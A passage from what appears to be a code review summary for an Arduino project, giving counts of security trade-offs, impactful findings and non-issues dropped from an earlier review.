- **Security ADR Trade-offs:** 6 items (documented, not bugs)
- **Total Impactful Findings:** 20

**Removed from original review:** 20 non-issues including Arduino architecture patterns, style inconsistencies, and items that don't affect functionality or correctness.
